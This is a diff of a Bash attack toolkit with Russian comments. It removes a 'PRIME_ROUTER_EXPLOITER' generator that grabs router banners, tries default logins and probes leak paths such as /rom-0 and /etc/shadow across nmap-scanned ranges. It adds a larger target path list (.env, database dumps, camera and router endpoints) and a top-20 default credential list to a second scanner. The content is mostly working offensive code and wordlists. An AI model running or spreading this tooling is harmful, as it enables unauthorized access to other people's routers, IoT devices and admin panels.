@@ -939,82 +939,6 @@ run_pwd_gen() {
     read
 }
 
-generate_router_analyzer_tool() {
-    local target_file="$1"
-    local code=$(cat << 'EOF'
-#!/bin/bash
-# PRIME_ROUTER_EXPLOITER (Terminal Intelligence)
-
-TARGET="$1"
-PORT="${2:-80}"
-
-if [[ -z "$TARGET" ]]; then
-    echo -e "\e[1;31mUsage: router-scan <IP> [PORT]\e[0m"
-    exit 1
-fi
-
-echo "--------------------------------------------------"
-echo ">> ANALYZING TARGET: $TARGET:$PORT"
-echo "--------------------------------------------------"
-
-# 1. Индикация модели (Banner Grabbing)
-BANNER=$(curl -s -I "http://$TARGET:$PORT" | grep -iE "Server|WWW-Authenticate")
-echo -e "\e[1;34m[+] IDENTIFICATION:\e[0m"
-echo "    $BANNER"
-
-# 2. Попытка дефолтных логинов (Quick Check)
-echo -e "\e[1;34m[+] TESTING DEFAULT ACCESS (admin:admin, admin:password...):\e[0m"
-# Здесь можно интегрировать вызов словаря, но для CLI сделаем проверку на пустой пароль
-CHECK=$(curl -s -o /dev/null -w "%{http_code}" "http://admin:admin@$TARGET:$PORT")
-if [[ "$CHECK" == "200" ]]; then
-    echo -e "    \e[1;32m[!] VULNERABLE: Default credentials (admin:admin) accepted!\e[0m"
-fi
-
-# 3. Попытка чтения конфигов (известные уязвимости типа Rom-0)
-echo -e "\e[1;34m[+] CHECKING KNOWN LEAKS (config/rom-0):\e[0m"
-LEAKS=("/rom-0" "/config.exp" "/etc/shadow" "/get_set.cgi?get=wifi_settings")
-
-for path in "${LEAKS[@]}"; do
-    STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "http://$TARGET:$PORT$path")
-    if [[ "$STATUS" == "200" ]]; then
-        echo -e "    \e[1;32m[!] FOUND POTENTIAL LEAK:\e[0m http://$TARGET:$PORT$path"
-        # В реальной версии здесь был бы парсер ключей из бинарного файла
-    fi
-done
-
-echo "--------------------------------------------------"
-EOF
-)
-    smart_cat "$target_file" "$code"
-    chmod +x "$target_file"
-}
-
-run_router_scan() {
-    clear
-    echo -e "\e[1;32m[ PRIME ROUTER SCANNER & ANALYZER ]\e[0m"
-    echo -e "Mode: Intelligent Discovery & Credential Extraction\n"
-    
-    read -p "ENTER TARGET RANGE (e.g., 192.168.1.0/24): " R_RANGE
-    
-    echo -e "\e[1;34m[*] Scanning for active HTTP gateways...\e[0m"
-    
-    # Используем nmap для быстрого поиска открытых 80/8080 портов
-    TARGETS=$(nmap -p 80,8080,443 --open -n "$R_RANGE" | grep "Nmap scan report" | awk '{print $5}')
-    
-    if [[ -z "$TARGETS" ]]; then
-        echo -e "\e[1;31m[!] NO ROUTERS FOUND IN RANGE\e[0m"
-    else
-        for ip in $TARGETS; do
-            echo -e "\n\e[1;33m[ PROCESSING $ip ]\e[0m"
-            router-scan "$ip"
-        done
-    fi
-    
-    echo -e "\n\e[1;33mPRESS ENTER TO RETURN...\e[0m"
-    read
-}
-
-
 generate_prime_router_scan_v2() {
     local target_file="$1"
     local code=$(cat << 'EOF'
@@ -1045,9 +969,38 @@ check_access() {
 }
 
 # Список критических путей (от роутеров до админок сайтов и DB-веб-интерфейсов)
-PATHS=("/" "/admin" "/config.php" "/phpmyadmin" "/setup.cgi" "/wizard.html" "/get_set.cgi")
+# Тотальный список путей (Router, IoT, CMS, DB, Backups)
+PATHS=(
+  "/" "/admin" "/login" "/panel"          # Базовые
+  "/wp-login.php" "/administrator"        # WordPress & Joomla
+  "/phpmyadmin" "/pma" "/myadmin"         # DB Interfaces
+  "/setup.cgi" "/wizard.html"             # Routers
+  "/get_set.cgi" "/config.exp" "/rom-0"   # Router Vulnerabilities
+  "/user/login" "/admin.php" "/manager"   # Generic CMS
+  "/api/v1" "/swagger-ui.html"            # API & Dev Tools
+  "/axis-cgi/jpg/image.cgi"               # IP Cameras (Axis)
+  "/view/view.shtml"                      # IP Cameras (Mobotix)
+  "/.env" "/config.json" "/settings.py"   # Сверхчувствительные конфиги
+  "/backup.sql" "/dump.sql" "/db.bak"     # Забытые бэкапы БД
+  "/cgi-bin/config.exp"                   # DrayTek & others
+)
+
+
 # Минимальный набор самых эффективных пар (Эвристический топ)
-CREDS=("admin:admin" "admin:password" "root:root" "admin:" "admin:1234" "root:12345")
+# Эвристический топ-20 (на базе статистики реальных взломов)
+CREDS=(
+  "admin:admin" "admin:password" "admin:"     # Классика
+  "root:root" "root:123456" "root:"           # Linux/Unix/IoT
+  "admin:1234" "admin:12345"                  # Hikvision & D-Link
+  "ubnt:ubnt"                                 # Ubiquiti (AirMax, UniFi)
+  "admin:admin123" "admin:admin1234"          # TP-Link & Huawei
+  "support:support"                           # Инженерные входы
+  "user:user" "guest:guest"                   # Гостевые доступы
+  "telecomadmin:admintelecom"                 # Оптические терминалы (GPON)
+  "root:pass" "admin:pass"                    # Стандартные заглушки
+  "oracle:oracle" "postgres:postgres"         # DB Defaults
+  "pi:raspberry"                              # Raspberry Pi & IoT
+)
 
 for path in "${PATHS[@]}"; do
     URL="http://$TARGET$path"
